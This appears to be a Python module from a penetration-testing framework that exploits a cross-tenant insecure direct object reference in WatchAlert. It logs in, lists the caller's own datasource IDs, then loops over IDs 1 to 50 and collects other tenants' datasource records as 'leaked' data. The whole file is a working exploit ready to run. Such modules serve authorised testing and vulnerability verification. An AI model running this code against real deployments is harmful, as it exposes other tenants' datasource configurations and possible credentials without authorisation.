#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WatchAlert API helpers."""

from __future__ import annotations

import json
from typing import Any, Dict, List, Optional

from core.framework.base_module import BaseModule


class Watchalert(BaseModule):
    """Login and cross-tenant datasource IDOR."""

    def _wa_creds(self) -> tuple[str, str, str]:
        user = getattr(self, "username", "")
        pwd = getattr(self, "password", "")
        tenant = getattr(self, "tenant_id", "")
        for opt in (user, pwd, tenant):
            if hasattr(opt, "value"):
                pass
        if hasattr(user, "value"):
            user = user.value
        if hasattr(pwd, "value"):
            pwd = pwd.value
        if hasattr(tenant, "value"):
            tenant = tenant.value
        return str(user or ""), str(pwd or ""), str(tenant or "")

    def watchalert_login(self) -> bool:
        user, pwd, _ = self._wa_creds()
        resp = self.http_request(
            "POST",
            "/api/user/login",
            json={"username": user, "password": pwd},
            headers={"Content-Type": "application/json"},
            timeout=20,
            session=True,
        )
        if not resp or int(resp.status_code or 0) != 200:
            return False
        try:
            data = resp.json()
        except Exception:
            return False
        token = (data.get("data") or {}).get("token") or data.get("token")
        if not token:
            return False
        self.session.headers["Authorization"] = f"Bearer {token}"
        return True

    def watchalert_own_datasource_ids(self) -> List[int]:
        _, _, tenant = self._wa_creds()
        resp = self.http_request(
            "GET",
            f"/api/w/{tenant}/datasource/list",
            timeout=20,
            session=True,
        )
        if not resp or int(resp.status_code or 0) != 200:
            return []
        try:
            payload = resp.json()
        except Exception:
            return []
        rows = payload.get("data") or []
        ids = []
        for row in rows:
            if isinstance(row, dict) and row.get("id") is not None:
                ids.append(int(row["id"]))
        return ids

    def watchalert_get_datasource(self, ds_id: int) -> Optional[Dict[str, Any]]:
        _, _, tenant = self._wa_creds()
        resp = self.http_request(
            "GET",
            f"/api/w/{tenant}/datasource/dataSourceGet",
            params={"id": int(ds_id)},
            timeout=15,
            session=True,
        )
        if not resp or int(resp.status_code or 0) != 200:
            return None
        try:
            payload = resp.json()
        except Exception:
            return None
        data = payload.get("data")
        return data if data else None

    def watchalert_idor_probe(self, max_id: int = 50) -> List[dict]:
        own = set(self.watchalert_own_datasource_ids())
        leaked: List[dict] = []
        for ds_id in range(1, max(1, int(max_id)) + 1):
            if ds_id in own:
                continue
            data = self.watchalert_get_datasource(ds_id)
            if data:
                leaked.append({"id": ds_id, "data": data})
        return leaked

    @staticmethod
    def watchalert_fingerprint(body: str) -> bool:
        blob = (body or "").lower()
        return "watchalert" in blob or "watch-alert" in blob